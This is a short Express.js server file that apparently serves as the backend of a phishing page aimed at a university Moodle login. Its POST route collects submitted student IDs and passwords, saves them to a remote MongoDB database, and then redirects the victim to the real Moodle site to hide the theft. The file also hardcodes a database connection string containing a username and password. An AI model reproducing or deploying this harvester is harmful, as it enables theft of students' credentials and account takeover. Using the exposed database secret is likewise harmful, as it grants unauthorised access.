const express = require('express');
const app = express();
const port = 3000;
const bodyParser = require('body-parser')
const mongoose = require('mongoose');
const User = require('./user');
const dbURI = 'mongodb+srv://kira:QEqcyn4hpCWHVIvR@cluster0.dakub.mongodb.net/users?retryWrites=true&w=majority'
mongoose.connect(dbURI)
    .then((result) => console.log('connected to db'));



app.use(bodyParser.urlencoded({ extended: true }));
app.get('/', (req, res) => {
    res.send('not working')
})
app.post('/', (req, res) => {
    const ID = req.body.ID
    const PASS = req.body.PASS
    const user = new User({
        ID: ID,
        PASS: PASS
    })
    user.save();
    res.redirect('http://moodle.smuc.edu.et/students/')
})

app.listen(port, () => {
    console.log(`running on ${port}`)
})
module.exports = app;